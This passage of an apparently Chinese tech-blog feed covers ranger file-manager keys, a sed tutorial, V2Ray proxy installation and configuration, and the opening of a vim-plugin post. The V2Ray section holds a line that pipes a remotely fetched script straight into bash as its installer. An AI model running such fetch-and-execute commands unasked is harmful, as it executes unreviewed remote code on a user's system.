<h3 id="运行文件"><a href="#运行文件" class="headerlink" title="运行文件"></a>运行文件</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">l</span> 		#打开选中文件，ranger不知道文件的打开程序时，会提示 :open_with 用于指定程序</span><br><span class="line">r 		#指定程序打开文件 同 :open_with 命令</span><br><span class="line">S 		#在当前目录下打开<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<h4 id="open-with"><a href="#open-with" class="headerlink" title=":open_with"></a><code>:open_with</code></h4><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:open_with &lt;程序&gt; &lt;模式&gt; &lt;选项&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>&lt;程序&gt;</code> 指定程序，<code>~/.config/ranger/apps.py</code> 里面的定义了相应程序打开相应的文件，若没有该文件实用命令 <code>ranger --copy-config apps</code>生成</li>
<li><code>&lt;模式&gt;</code> <code>0</code> 窗口模式 ， <code>1</code>全屏模式</li>
<li><code>&lt;选项&gt;</code> 指定方式调用程序<ul>
<li><code>s</code> 静默模式，任何输出将被丢弃</li>
<li><code>d</code> 分离程序（在后台运行）</li>
<li><code>p</code> 将输入重定向到 pager</li>
<li><code>w</code> 当程序执行完成时需要用户回车确认</li>
</ul>
</li>
</ul>
<p>大写 &lt;选项&gt; 有相反的作用，如一程序默认就在后台运行，那么可以使用 <code>:open_with D</code> 来防止其在后台运行</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><code>:</code> 开头，可用 \<Tab> 补全<br>所有命令都在<code>~/.config/ranger/commands.py</code>中<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">cd</span> <span class="symbol">&lt;dirname&gt;</span> 			#跳转到目录 <span class="symbol">&lt;dirname&gt;</span></span><br><span class="line">:chmod <span class="symbol">&lt;octal_number&gt;</span> 	#设置被选项的权限</span><br><span class="line">:<span class="keyword">delete</span> 				#删除被选项</span><br><span class="line">:<span class="keyword">edit</span> <span class="symbol">&lt;filename&gt;</span> 		#编辑文件</span><br><span class="line">:<span class="built_in">filter</span> <span class="symbol">&lt;string&gt;</span> 		#只显示文件名中含有给定字符串 <span class="symbol">&lt;string&gt;</span> 的文件</span><br><span class="line">:<span class="keyword">find</span> <span class="symbol">&lt;regexp&gt;</span> 			#查找匹配给定正则表达式的文件，并且执行第一个匹配的文件</span><br><span class="line">:<span class="keyword">grep</span> <span class="symbol">&lt;string&gt;</span> 			#在选定的项中查找给定的字符串 <span class="symbol">&lt;string&gt;</span></span><br><span class="line">:<span class="keyword">mark</span> <span class="symbol">&lt;regexp&gt;</span> 			#选定匹配正则表达式的所有文件</span><br><span class="line">:unmark <span class="symbol">&lt;regexp&gt;</span> 		#取消选定匹配正则表达式的所有文件</span><br><span class="line">:<span class="built_in">mkdir</span> <span class="symbol">&lt;dirname&gt;</span> 		#创建目录</span><br><span class="line">:open_with &lt;program&lt; <span class="symbol">&lt;mode&gt;</span> <span class="symbol">&lt;flags&gt;</span> 	#给定参数打开文件，未给任何参数时，等价于 <span class="symbol">&lt;Enter&gt;</span>   </span><br><span class="line">:<span class="keyword">quit</span> 					#退出</span><br><span class="line">:<span class="built_in">rename</span> <span class="symbol">&lt;newname&gt;</span> 		#重命名当前文件</span><br><span class="line">:<span class="built_in">search</span> <span class="symbol">&lt;regexp&gt;</span> 		#搜索所有匹配正则表达式 <span class="symbol">&lt;regexp&gt;</span> 的文件，同<span class="keyword">vim</span> 中的 / ；快捷键：/</span><br><span class="line">:<span class="keyword">shell</span> [-<span class="symbol">&lt;flags&gt;</span>] <span class="symbol">&lt;command&gt;</span> 	#运行命令 <span class="symbol">&lt;command&gt;</span></span><br><span class="line">:<span class="keyword">set</span> <span class="keyword">colorscheme</span> snow 	#设置颜色模式</span><br><span class="line">:touch <span class="symbol">&lt;filename&gt;</span> 		#创建文件</span><br><span class="line"></span><br><span class="line">## 除了`:<span class="keyword">delete</span>`,所有的命令可不用写全，前提与输入字母匹配的命令只有一个</span><br></pre></td></tr></table></figure></Tab></p>
<h3 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">w</span> 		#打开/关闭任务视图</span><br><span class="line">dd 		#终止一个任务</span><br><span class="line">J 		#降低当前任务的优先级</span><br><span class="line">K 		#提升当前任务的优先级 </span><br></pre></td></tr></table></figure>
<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">z</span> 		#切换设置</span><br><span class="line">zf 		#过滤器(如过滤pdf文件, zf+pdf,回车)</span><br><span class="line">S 		#在当前目录打开终端</span><br><span class="line"><span class="keyword">z</span>(*) 	#改变设置, *表示在弹出选项中的选择</span><br><span class="line"><span class="keyword">o</span>(*) 	#改变排序方式</span><br><span class="line">! / s 	#使用<span class="keyword">shell</span>命令(！<span class="keyword">shell</span> -<span class="keyword">w</span> <span class="keyword">ls</span> -hl %s,%s代表当前被选中的文件)</span><br><span class="line">: 		#使用ranger命令</span><br><span class="line"><span class="keyword">u</span> 		#撤销操作</span><br><span class="line">W 		#打开消息日志</span><br><span class="line">du 		#显示当前目录的磁盘占用情况</span><br><span class="line">R 		#刷新当前目录</span><br><span class="line"><span class="symbol">&lt;Ctrl-R&gt;</span> 	#清空缓存并刷新目录</span><br><span class="line"><span class="symbol">&lt;Ctrl-L&gt;</span> 	#重画当前窗口</span><br></pre></td></tr></table></figure>
<h2 id="快速预览"><a href="#快速预览" class="headerlink" title="快速预览"></a>快速预览</h2><p>修改 <code>~/.config/ranger/scope.sh</code>配置（默认配置就行）并安装以下程序可实现快速预览相关文件<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#推荐</span><br><span class="line">elinks 		#html</span><br><span class="line"><span class="keyword">highlight</span> 	#text/code</span><br><span class="line">img2txt 	#image</span><br><span class="line">atool 		#压缩包</span><br><span class="line">pdftotext 	#pdf</span><br><span class="line">medinfo 	#audio/video</span><br></pre></td></tr></table></figure></p>
<p><strong><a href="https://github.com/ranger/ranger">官方仓库</a>中列出的程序</strong></p>
<ul>
<li><code>img2txt</code>（基于<code>caca-utils</code>） 用于ASCII图像预览</li>
<li><code>w3mimgdisplay</code>、<code>ueberzug</code>、<code>kitty</code>、<code>terminology</code>、<code>urxvt</code> 用于图像预览</li>
<li><code>convert</code>（基于<code>imagemagick</code>） 自动旋转图像并进行SVG预览</li>
<li><code>ffmpegthumbnailer</code> 用于视频缩略图</li>
<li><code>highlight</code>、<code>pygmentize</code> 用于代码的语法突出显示</li>
<li><code>atool</code>、<code>bsdtar</code>、<code>unrar</code>和/或<code>7z</code> 用于预览压缩包</li>
<li><code>bsdtar</code>、<code>tar</code>、<code>unrar</code>和/或<code>unzip</code> 用于预览压缩包</li>
<li><code>lynx</code>、<code>w3m</code>、<code>elinks</code> 用于预览html页面</li>
<li><code>pdftotext</code>、<code>mutool</code> pdf预览，pdftoppm以图像预览</li>
<li><code>djvutxt</code> 用于文本DjVu预览 <code>ddjvu</code> 以图像预览</li>
<li><code>calibre</code>、<code>epub-thumbnailer</code> 用于电子书的图像预览</li>
<li><code>transmission-show</code> 用于查看BitTorrent信息</li>
<li><code>mediainfo</code>、<code>exiftool</code> 用于查看有关媒体文件的信息</li>
<li><code>odt2txt</code> 为OpenDocument文本文件（odt，ods，odp和sxw）</li>
<li><code>python</code>、<code>jq</code> JSON文件</li>
<li><code>fontimage</code> 用于字体预览</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ranger</tag>
        <tag>终端</tag>
        <tag>文件管理器</tag>
      </tags>
  </entry>
  <entry>
    <title>sed功能强大的流式文本编辑器</title>
    <url>/2019/10/24/sed%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84%E6%B5%81%E5%BC%8F%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/</url>
    <content><![CDATA[<h1 id="sed功能强大的流式文本编辑器"><a href="#sed功能强大的流式文本编辑器" class="headerlink" title="sed功能强大的流式文本编辑器"></a>sed功能强大的流式文本编辑器</h1><p>  sed 是一种流编辑器，配合正则表达式使用，功能不同凡响。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非使用重定向存储输出。sed主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。<br>  <strong>sed可集合通道符<code>|</code>使用</strong></p>
<h2 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed [options] <span class="string">&#x27;command&#x27;</span> file(s)</span><br><span class="line">sed [options] -f scriptfile file(s)</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="选项-options-、参数"><a href="#选项-options-、参数" class="headerlink" title="选项(options)、参数"></a>选项(options)、参数</h2><p>  <strong>选项</strong>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-e&lt;script&gt;或--expression&#x3D;&lt;script&gt;：以选项中的指定的script来处理输入的文本文件；</span><br><span class="line">-f&lt;script文件&gt;或--file&#x3D;&lt;script文件&gt;：以选项中指定的script文件来处理输入的文本文件；</span><br><span class="line">-h或--help：显示帮助；</span><br><span class="line">-n或--quiet或——silent：仅显示script处理后的结果；</span><br><span class="line">-V或--version：显示版本信息。</span><br></pre></td></tr></table></figure>
<p>  <strong>参数</strong>: 指定待处理的文本文件列表。</p>
<h2 id="sed指令"><a href="#sed指令" class="headerlink" title="sed指令"></a>sed指令</h2><p>  <strong>sed命令</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a\ 		# 在当前行下面插入文本</span><br><span class="line">i\ 		# 在当前行上面插入文本</span><br><span class="line">c\ 		# 把选定的行改为新的文本</span><br><span class="line">d 		# 删除，删除选择的行</span><br><span class="line">D 		# 删除模板块的第一行</span><br><span class="line">s 		# 替换指定字符</span><br><span class="line">h 		# 拷贝模板块的内容到内存中的缓冲区</span><br><span class="line">H 		# 追加模板块的内容到内存中的缓冲区</span><br><span class="line">g 		# 获得内存缓冲区的内容，并替代当前模板块中的文本。</span><br><span class="line">G 		# 获得内存缓冲区的内容，并追加到当前模板块文本的后面</span><br><span class="line">l 		# 列表不能打印字符的清单</span><br><span class="line">n 		# 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令</span><br><span class="line">N 		# 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码</span><br><span class="line">p 		# 打印模板块的行</span><br><span class="line">P 		# (大写) 打印模板块的第一行</span><br><span class="line">q 		# 退出Sed</span><br><span class="line">b lable # 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾</span><br><span class="line">r file 	# 从file中读行</span><br><span class="line">t label # if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾</span><br><span class="line">T label # 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾</span><br><span class="line">w file 	# 写并追加模板块到file末尾 </span><br><span class="line">W file 	# 写并追加模板块的第一行到file末尾</span><br><span class="line">! 		# 表示后面的命令对所有没有被选定的行发生作用 </span><br><span class="line">&#x3D; 		# 打印当前行号码 </span><br><span class="line"># 		# 把注释扩展到下一个换行符以前</span><br></pre></td></tr></table></figure>
<p>  <strong>替换标记</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g 		# 表示行内全面替换  </span><br><span class="line">p 		# 表示打印行</span><br><span class="line">w 		# 表示把行写入一个文件</span><br><span class="line">x 		# 表示互换模板块中的文本和缓冲区中的文本</span><br><span class="line">y 		# 表示把一个字符翻译为另外的字符（但是不用于正则表达式）</span><br><span class="line">\1 		# 子串匹配标记</span><br><span class="line">&amp; 		# 已匹配字符串标记</span><br></pre></td></tr></table></figure>
<p>  <strong>sed元字符集</strong>:</p>
<p>  sed使用的正则表达式是括在斜杠线”/”之间的模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^ 		# 匹配行开始，如：&#x2F;^sed&#x2F;匹配所有以sed开头的行</span><br><span class="line">$ 		# 匹配行结束，如：&#x2F;sed$&#x2F;匹配所有以sed结尾的行</span><br><span class="line">. 		# 匹配一个非换行符的任意字符，如：&#x2F;s.d&#x2F;匹配s后接一个任意字符，最后是d</span><br><span class="line">* 		# 匹配0个或多个字符，如：&#x2F;*sed&#x2F;匹配所有模板是一个或多个空格后紧跟sed的行</span><br><span class="line">[] 		# 匹配一个指定范围内的字符，如：&#x2F;[ss]ed&#x2F;匹配sed和Sed</span><br><span class="line">[^] 	# 匹配一个不在指定范围内的字符，如：&#x2F;[^A-RT-Z]ed&#x2F;匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行</span><br><span class="line">\(..\) 	# 保存匹配的字符，如：s&#x2F;\(love\)able&#x2F;\1rs，loveable被替换成lovers</span><br><span class="line">&amp; 		# 保存搜索字符用来替换其他字符，如：s&#x2F;love&#x2F; **&amp;** &#x2F;，love这成 **love** </span><br><span class="line">\&lt; 		# 匹配单词的开始，如:&#x2F;\&lt;love&#x2F;匹配包含以love开头的单词的行</span><br><span class="line">\&gt; 		# 匹配单词的结束，如：&#x2F;love\&gt;&#x2F;匹配包含以love结尾的单词的行</span><br><span class="line">x\&#123;m\&#125; 	# 连续m个x，如：&#x2F;0\&#123;5\&#125;&#x2F;匹配包含5个0的行</span><br><span class="line">x\&#123;m,\&#125; # 至少m个x，如：&#x2F;0\&#123;5,\&#125;&#x2F;匹配至少有5个0的行</span><br><span class="line">x\&#123;m,n\&#125; # 至少m个x，但不多于n个，如：&#x2F;0\&#123;5,10\&#125;&#x2F;匹配5~10个0的行</span><br></pre></td></tr></table></figure>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>  <strong>再第5行后添加一行，并输出结果</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -e 5a\newline file_name</span><br></pre></td></tr></table></figure>
<p>  <strong>删除行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除第2行</span></span><br><span class="line">sed <span class="string">&#x27;2d&#x27;</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除第2~5行</span></span><br><span class="line">sed <span class="string">&#x27;2,5d&#x27;</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示行号和内容，同时删除2~5行</span></span><br><span class="line">nl file_name | sed <span class="string">&#x27;2,5d&#x27;</span></span><br></pre></td></tr></table></figure>
<p>  <strong>行加内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第2行尾加内容</span></span><br><span class="line">sed <span class="string">&#x27;2a test&#x27;</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2行前加内容</span></span><br><span class="line">sed <span class="string">&#x27;2i test&#x27;</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2行尾加内容，再换行加内容</span></span><br><span class="line">sed `2a <span class="built_in">test</span> \</span><br><span class="line">test2`</span><br></pre></td></tr></table></figure>
<p>  <strong>替换行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 替换第2~5行</span></span><br><span class="line">sed `2,5c <span class="built_in">test</span>` file_name</span><br></pre></td></tr></table></figure>
<p>  <strong>显示指定行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示第5~7行</span></span><br><span class="line">nl <span class="built_in">test</span> | sed -n <span class="string">&#x27;5,7p&#x27;</span></span><br></pre></td></tr></table></figure>
<p>  <strong>搜索内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索有关键字的行</span></span><br><span class="line">cat file_name | sed <span class="string">&#x27;/test/p&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索并删除</span></span><br><span class="line">cat file_name | sed <span class="string">&#x27;/test/p&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索并执行指令,执行&#123;&#125;内的内容，每个命令用分号分隔</span></span><br><span class="line">nl file_name  | sed <span class="string">&#x27;/test/&#123;s/bulabula/hehehe/;p;q&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>  <strong>搜寻并替换</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/要被取代的字串/新的字串/g&#x27;</span></span><br></pre></td></tr></table></figure>
<p>  <strong>多点编辑</strong></p>
<p>  一条sed命令，删除第三行到末尾的数据，并把test替换为TEST</p>
<p>  <code>-e</code>表示多点编辑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl file_name | sed -e <span class="string">&#x27;3,$d&#x27;</span> -e <span class="string">&#x27;s/test/TEST/&#x27;</span></span><br></pre></td></tr></table></figure>
<p>更多参考：<br><a href="https://man.linuxde.net/sed">https://man.linuxde.net/sed</a><br><a href="https://zhang.ge/1926.html">https://zhang.ge/1926.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>v2ray安装使用</title>
    <url>/2019/10/01/v2ray%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>在Linux上安装需要先安装curl、zip、unzip，运行脚本需要用到</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># archlinux可直接安装</span></span><br><span class="line">sudo pacman -S v2ray</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure><br><strong>go.sh脚本会自动安装以下文件</strong>：</p>
<ul>
<li><code>/usr/bin/v2ray/v2ray</code>：V2Ray 程序；</li>
<li><code>/usr/bin/v2ray/v2ctl</code>：V2Ray 工具；</li>
<li><code>/etc/v2ray/config.json</code>：配置文件；</li>
<li><code>/usr/bin/v2ray/geoip.dat</code>：IP 数据文件</li>
<li><code>/usr/bin/v2ray/geosite.dat</code>：域名数据文件</li>
</ul>
<p>该脚本会配置自动运行脚本（开机自启），目前自动运行脚本只支持带有 Systemd 的系统，以及 Debian / Ubuntu 全系列</p>
<p>运行脚本位于系统的以下位置：</p>
<ul>
<li><code>/etc/systemd/system/v2ray.service</code>: <strong>Systemd管理</strong></li>
<li><code>/etc/init.d/v2ray</code>: <strong>SysV管理</strong></li>
</ul>
<h3 id="go-sh-参数"><a href="#go-sh-参数" class="headerlink" title="go.sh 参数"></a>go.sh 参数</h3><p>go.sh 支持如下参数，可在手动安装时根据实际情况调整：</p>
<ul>
<li><code>-p</code> 或 <code>--proxy</code>: 使用代理服务器来下载 V2Ray 的文件，格式与 curl 接受的参数一致，比如 <code>&quot;socks5://127.0.0.1:1080&quot;</code> 或 <code>&quot;http://127.0.0.1:3128&quot;</code>。</li>
<li><code>-f</code> 或 <code>--force</code>: 强制安装。在默认情况下，如果当前系统中已有最新版本的 V2Ray，go.sh 会在检测之后就退出。如果需要强制重装一遍，则需要指定该参数。</li>
<li><code>--version</code>: 指定需要安装的版本，比如 “v1.13”。不指定则默认安装最新版本。</li>
<li><code>--local</code>: 使用一个本地文件进行安装。如果你已经下载了某个版本的 V2Ray，则可通过这个参数指定一个文件路径来进行安装。</li>
</ul>
<p>示例：</p>
<ul>
<li>使用地址为 <code>127.0.0.1:1080</code> 的 SOCKS 代理下载并安装最新版本：<code>./go.sh -p socks5://127.0.0.1:1080</code></li>
<li>安装本地的 v1.13 版本：<code>./go.sh --version v1.13 --local /path/to/v2ray.zip</code></li>
</ul>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><p>编辑 <code>/etc/v2ray/config.json</code> 文件来配置你需要的代理方式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;inbounds&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;port&quot;</span>: 16823, // 服务器监听端口</span><br><span class="line">      <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;vmess&quot;</span>,    // 主传入协议</span><br><span class="line">      <span class="string">&quot;settings&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;clients&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span>,  // 用户 ID，客户端与服务器必须相同</span><br><span class="line">            <span class="string">&quot;alterId&quot;</span>: 64</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;outbounds&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;freedom&quot;</span>,  // 主传出协议</span><br><span class="line">      <span class="string">&quot;settings&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><a href="https://www.v2fly.org/chapter_02/01_overview.html">详细配置说明</a></p>
<h3 id="防火墙开放端口"><a href="#防火墙开放端口" class="headerlink" title="防火墙开放端口"></a>防火墙开放端口</h3><p><strong>iptables</strong>:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看已开放端口</span></span><br><span class="line">/etc/init.d/iptables status</span><br><span class="line"></span><br><span class="line"><span class="comment">#开放8080端口</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 8080 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存并重启防火墙</span></span><br><span class="line">/etc/rc.d/init.d/iptables save</span><br><span class="line">/etc/init.d/iptables restart</span><br></pre></td></tr></table></figure><br><strong>frewalld</strong>:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看已开放端口</span></span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line"></span><br><span class="line"><span class="comment">#开放8080端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line"></span><br><span class="line"><span class="comment">#更新规则</span></span><br><span class="line">firewall-cmd --reload 		<span class="comment">#无需断开连接，firealld特性之一动态添加规则</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --complete-reload    <span class="comment">#断开连接，类似于重启服务</span></span><br></pre></td></tr></table></figure></p>
<h3 id="程序管理"><a href="#程序管理" class="headerlink" title="程序管理"></a>程序管理</h3><p>运行 <code>service v2ray start</code> 或<code>systemctl start v2ray</code>来启动 V2Ray 进程<br>之后可以使用 <code>start</code>|<code>stop</code>|<code>status</code>|<code>reload</code>|<code>restart</code>|<code>force-reload</code> 控制 V2Ray 的运行</p>
<h2 id="一键安装脚本-小白玩的"><a href="#一键安装脚本-小白玩的" class="headerlink" title="一键安装脚本(小白玩的)"></a>一键安装脚本(小白玩的)</h2><p><a href="https://github.com/233boy/v2ray/wiki/V2Ray一键安装脚本">V2Ray一键安装脚本（含教程）</a></p>
<h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><h2 id="Windows和Mac-OS"><a href="#Windows和Mac-OS" class="headerlink" title="Windows和Mac OS"></a>Windows和Mac OS</h2><p>根据需求<a href="https://github.com/v2ray/v2ray-core/releases">到V2Ray的仓管下载发布的最新版</a><br>下载解压之后可看到 v2ray 或 v2ray.exe 直接运行即可</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h4 id="图形客户端"><a href="#图形客户端" class="headerlink" title="图形客户端"></a>图形客户端</h4><p>下载图形化客户端<a href="https://github.com/lhy0403/Qv2ray/releases">Qv2ray</a>,archlinux可通过AUR直接安装<br>解压后双运行，这是会提示没有内核并自动打开存放内核的目录，到<a href="https://github.com/v2ray/v2ray-core/releases">V2Ray的仓库</a>下载Linux版的内核，讲内核解压放到自动打开的目录即可</p>
<p>Qv2ray 在不同系统中查找 v2ray 内核的文件路径 （即找不到内核时自动弹出的文件夹路径）</p>
<ul>
<li>Windows: C:\Users\用户名.qv2ray\vcore</li>
<li>macOS: /Users/用户名/.qv2ray/vcore</li>
<li>Linux: ~/.qv2ray/vcore</li>
</ul>
<h4 id="非图形客户端"><a href="#非图形客户端" class="headerlink" title="非图形客户端"></a>非图形客户端</h4><p>直接和安装服务器版的一样，安装即可<br><strong>配置</strong>：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;inbounds&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;port&quot;</span>: 1080, // 监听端口</span><br><span class="line">      <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;socks&quot;</span>, // 入口协议为 SOCKS 5</span><br><span class="line">      <span class="string">&quot;sniffing&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;destOverride&quot;</span>: [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;tls&quot;</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;settings&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;auth&quot;</span>: <span class="string">&quot;noauth&quot;</span>  //socks的认证设置，noauth 代表不认证，由于 socks 通常在客户端使用，所以这里不认证</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;outbounds&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;vmess&quot;</span>, // 出口协议</span><br><span class="line">      <span class="string">&quot;settings&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;vnext&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">&quot;address&quot;</span>: <span class="string">&quot;serveraddr.com&quot;</span>, // 服务器地址，请修改为你自己的服务器 IP 或域名</span><br><span class="line">            <span class="string">&quot;port&quot;</span>: 16823,  // 服务器端口</span><br><span class="line">            <span class="string">&quot;users&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: <span class="string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span>,  // 用户 ID，必须与服务器端配置相同</span><br><span class="line">                <span class="string">&quot;alterId&quot;</span>: 64 // 此处的值也应当与服务器相同</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><a href="https://www.v2fly.org/chapter_02/01_overview.html">详细配置说明</a></p>
<p><a href="https://github.com/v2ray/v2ray-core">【V2Ray仓库】</a><br><a href="https://www.v2ray.com/">【V2Ray官网】（墙外）</a><br><a href="https://www.v2fly.com">【V2Ray用户手册】</a><a href="https://www.v2ray.com">【墙外】</a><br><a href="https://guide.v2fly.org">【V2Ray白话文指南】（社区版）</a><a href="https://toutyrater.github.io/">【官方版】</a></p>
]]></content>
      <tags>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title>vim插件</title>
    <url>/2019/08/10/vim%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="Vim插件"><a href="#Vim插件" class="headerlink" title="Vim插件"></a>Vim插件</h1><h3 id="安装插件管理器"><a href="#安装插件管理器" class="headerlink" title="安装插件管理器"></a>安装插件管理器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/<span class="built_in">autoload</span>/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim	<span class="comment">#安装plugvim ~/.vim/vimrc	#在vimrc文件中启用plug插件管理，并添加配置插件</span></span><br></pre></td></tr></table></figure>
<h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h3><a id="more"></a>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;                               _ ____   __     _____ __  __ ____   ____</span></span><br><span class="line"><span class="comment">&quot;   ___  ___  _ __  _   _ _ __ ( ) ___|  \ \   / /_ _|  \/  |  _ \ / ___|</span></span><br><span class="line"><span class="comment">&quot;  / _ \/ _ \| &#x27;_ \| | | | &#x27;_ \|/\___ \   \ \ / / | || |\/| | |_) | |</span></span><br><span class="line"><span class="comment">&quot; |  __/ (_) | | | | |_| | | | |  ___) |   \ V /  | || |  | |  _ &lt;| |___</span></span><br><span class="line"><span class="comment">&quot;  \___|\___/|_| |_|\__,_|_| |_| |____/     \_/  |___|_|  |_|_| \_\\____|</span></span><br><span class="line"><span class="comment">&quot; ===============================木He寸&amp;eonun===============================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===================</span></span><br><span class="line"><span 